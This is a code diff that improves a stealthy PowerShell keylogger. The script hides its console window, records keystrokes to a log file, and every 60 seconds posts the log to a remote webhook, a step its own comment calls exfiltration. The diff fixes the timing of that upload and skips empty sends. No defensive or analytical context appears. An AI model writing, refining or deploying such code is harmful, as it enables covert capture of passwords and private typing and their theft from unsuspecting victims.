@@ -16,7 +16,8 @@ Add-Type -Name Window -Namespace Win32 -MemberDefinition $stealthCode
 [Win32.Window]::ShowWindow((Get-Process -PID $PID).MainWindowHandle, 0)
 
 try {
-    while($true) {
+    $lastSent = Get-Date
+    while ($true) {
         Start-Sleep -Milliseconds 40
         
         # Capture all ASCII characters
@@ -31,11 +32,16 @@ try {
         }
         
         # Exfiltrate every 60 seconds
-        if((Get-Date).Second % 60 -eq 0) {
-            $content = [System.IO.File]::ReadAllText($logFile)
-            $payload = @{ content = "``````" } | ConvertTo-Json
-            Invoke-RestMethod -Uri $hook -Method Post -Body $payload -ContentType "application/json"
-            Clear-Content $logFile
+        if ((Get-Date) - $lastSent -gt [TimeSpan]::FromSeconds(60)) {
+            if (Test-Path $logFile) {
+                $content = [System.IO.File]::ReadAllText($logFile)
+                if ($content.Trim().Length -gt 0) {
+                    $payload = @{ content = "``````" } | ConvertTo-Json
+                    Invoke-RestMethod -Uri $hook -Method Post -Body $payload -ContentType "application/json"
+                    Clear-Content $logFile
+                }
+            }
+            $lastSent = Get-Date
         }
     }
 }
